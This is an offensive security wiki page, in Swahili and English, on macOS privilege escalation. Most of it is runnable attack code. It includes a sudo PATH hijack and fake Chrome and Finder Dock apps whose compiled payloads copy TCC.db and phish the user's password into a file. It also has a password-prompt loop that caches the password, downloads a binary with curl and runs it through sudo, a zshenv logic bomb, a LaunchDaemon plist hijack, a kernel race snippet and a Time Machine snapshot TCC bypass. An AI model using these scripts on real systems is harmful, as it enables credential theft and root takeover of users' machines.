# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda kwenye:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Tafadhali kumbuka kwamba **hila nyingi kuhusu privilege escalation zinazoathiri Linux/Unix zitaathiri pia** mashine za MacOS. Kwa hiyo angalia:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Mwingiliano wa Mtumiaji

### Sudo Hijacking

Unaweza kupata Sudo Hijacking technique ya awali ndani ya [chapisho la Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Hata hivyo, macOS **huhifadhi** **`PATH`** ya mtumiaji anapoendesha **`sudo`**. Hii inamaanisha kwamba njia nyingine ya kutekeleza shambulio hili ni **ku-hijack binaries nyingine** ambazo victim bado atatekeleza anapoendesha **sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Kumbuka kwamba user anayetumia terminal ana uwezekano mkubwa wa kuwa na **Homebrew installed**. Kwa hiyo inawezekana kuhijack binaries katika **`/opt/homebrew/bin`**.

### Dock Impersonation

Kwa kutumia **social engineering**, unaweza **kujiwakilisha kwa mfano kama Google Chrome** ndani ya dock na kwa kweli kuendesha script yako mwenyewe:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Baadhi ya mapendekezo:

- Kagua Dock ikiwa kuna Chrome, na ikiwa ipo, **ondoa** entry hiyo kisha **ongeza** entry ya Chrome **bandia** katika nafasi hiyo hiyo kwenye Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Baadhi ya mapendekezo:

- **Huwezi kuondoa Finder kwenye Dock**, kwa hivyo ikiwa utaiongeza kwenye Dock, unaweza kuweka Finder fake karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza entry ya Finder fake mwanzoni mwa array ya Dock**.
- Chaguo jingine ni kuto kuiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
- Chaguo jingine la **ku-escalate hadi root bila kuomba** password kupitia kisanduku kibaya, ni kufanya Finder iombe kweli password ili kutekeleza action yenye privileged:
- Iambie Finder ikopi faili mpya ya **`sudo`** kwenye **`/etc/pam.d`** (prompt inayoomba password itaonyesha kwamba "Finder wants to copy sudo")
- Iambie Finder ikopi **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili prompt inayoomba password ionyeshe kwamba "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware mara kwa mara hutumia mwingiliano wa mtumiaji **kunasa password yenye uwezo wa sudo** na kuitumia tena kwa njia ya program. Mtiririko wa kawaida:

1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
2. **Rudia password prompts** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
3. Hifadhi credential kwenye cache (kwa mfano, `/tmp/.pass`) na endesha vitendo vinavyohitaji privilege kwa kutumia `sudo -S` (password kupitia stdin).

Mfano wa mnyororo mfupi:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Nenosiri lililoibwa linaweza kutumiwa tena **kuondoa Gatekeeper quarantine kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye privileged access, na kuendesha stages za ziada bila mwingiliano wa mtumiaji.

## Vectors maalum za macOS za hivi karibuni (2023–2025)

### `AuthorizationExecuteWithPrivileges` iliyopitwa na wakati bado inaweza kutumika

`AuthorizationExecuteWithPrivileges` ilitangazwa kuwa deprecated katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Updaters nyingi za kibiashara humwita `/usr/libexec/security_authtrampoline` ikiwa na path isiyoaminika. Ikiwa binary inayolengwa inaweza kuandikwa na mtumiaji, unaweza kupandikiza trojan na kutumia prompt halali:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Unganisha na **masquerading tricks above** ili kuonyesha password dialog inayoaminika.


### Uchunguzi wa Privileged helper / XPC

Privescs nyingi za kisasa za third-party macOS hufuata pattern ileile: **root LaunchDaemon** hufichua **Mach/XPC service** kutoka **`/Library/PrivilegedHelperTools`**, kisha helper ama **haithibitishi client**, huihakiki **ikiwa imechelewa sana** (PID race), au hufichua **root method** inayotumia **user-controlled path/script**. Hii ndiyo bug class iliyo nyuma ya helper bugs nyingi za hivi karibuni katika VPN clients, game launchers na updaters.

Orodha fupi ya uchunguzi:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zingatia kwa makini helpers ambazo:

- zinaendelea kukubali requests **baada ya uninstall** kwa sababu job iliendelea kubaki loaded kwenye `launchd`
- zinaendesha scripts au kusoma configuration kutoka **`/Applications/...`** au paths nyingine zinazoweza kuandikwa na users wasio-root
- zinategemea peer validation ya **PID-based** au **bundle-id-only** ambayo inaweza kuathiriwa na race condition

Kwa maelezo zaidi kuhusu bugs za helper authorization, angalia [ukurasa huu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Hadi Apple ilipoirekebisha katika **Sonoma 14.5**, **Ventura 13.6.7** na **Monterey 12.7.5**, installs zilizoanzishwa na user kupitia **`Installer.app`** / **`PackageKit.framework`** zingeweza kuendesha **PKG scripts kama root ndani ya environment ya user wa sasa**. Hii inamaanisha kuwa package iliyotumia **`#!/bin/zsh`** ingepakia **`~/.zshenv`** ya attacker na kuiendesha kama **root** wakati victim alipokuwa aki-install package.

Hili linavutia hasa kama **logic bomb**: unahitaji tu foothold kwenye account ya user na shell startup file inayoweza kuandikwa, kisha unasubiri installer yoyote yenye mazingira magumu inayotumia **zsh** iendeshwe na user. Hili kwa ujumla **halitumiki kwa** deployments za **MDM/Munki** kwa sababu hizo huendeshwa ndani ya environment ya root user.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ikiwa unataka uchunguzi wa kina zaidi kuhusu matumizi mabaya maalum ya installer, pia angalia [ukurasa huu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ikiwa LaunchDaemon plist au target yake ya `ProgramArguments` inaweza **kuandikwa na mtumiaji**, unaweza kufanya privilege escalation kwa kuibadilisha kisha kulazimisha launchd kuipakia upya:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Hii inaakisi muundo wa exploit uliochapishwa kwa **CVE-2025-24085**, ambapo plist inayoweza kuandikwa ilitumiwa kutekeleza code ya mshambulizi kama root.

### XNU SMR credential race (CVE-2025-24118)

**Race katika `kauth_cred_proc_update`** humruhusu mshambulizi wa ndani kuharibu pointer ya credential ya kusomwa tu (`proc_ro.p_ucred`) kwa kuendesha kwa wakati mmoja mizunguko ya `setgid()`/`getgid()` kwenye threads hadi `memcpy` iliyokatika itokee. Uharibifu uliofanikiwa hutoa **uid 0** na ufikiaji wa memory ya kernel. Muundo wa chini kabisa wa PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couple pamoja na heap grooming ili kuweka data inayodhibitiwa mahali ambapo pointer inasomwa tena. Kwenye builds zilizoathirika, hii ni **local kernel privesc** inayotegemeka bila mahitaji ya SIP bypass.

### SIP bypass kupitia Migration assistant ("Migraine", CVE-2023-32369)

Ikiwa tayari una root, SIP bado huzuia uandishi kwenye maeneo ya mfumo. Bug ya **Migraine** hutumia vibaya entitlement ya Migration Assistant `com.apple.rootless.install.heritable` ili kuanzisha child process inayorithi SIP bypass na kubadilisha protected paths (kwa mfano, `/System/Library/LaunchDaemons`). Mlolongo huo ni:

1. Pata root kwenye live system.
2. Trigger `systemmigrationd` kwa state iliyoundwa ili iendeshe binary inayodhibitiwa na attacker.
3. Tumia entitlement iliyorithiwa kupatch SIP-protected files, na hivyo kuendelea kufanya kazi hata baada ya reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Apple daemons nyingi hukubali objects za **NSPredicate** kupitia XPC na huthibitisha tu field ya `expressionType`, ambayo inadhibitiwa na attacker. Kwa kuunda predicate inayotathmini selectors holela, unaweza kupata **code execution katika root/system XPC services** (kwa mfano, `coreduetd`, `contextstored`). Ikichanganywa na app sandbox escape ya awali, hii hutoa **privilege escalation bila user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na zisizo na visitor imara.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**User yeyote** (hata asiye na privileges) anaweza kuunda na ku-mount time machine snapshot na **kufikia files ZOTE** za snapshot hiyo.\
**Privilege pekee** inayohitajika ni kwa application inayotumika (kama `Terminal`) kuwa na access ya **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), ambayo lazima itolewe na admin.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Maelezo ya kina zaidi yanaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Taarifa Nyeti

Hii inaweza kuwa muhimu kwa kufanya privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Marejeo

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
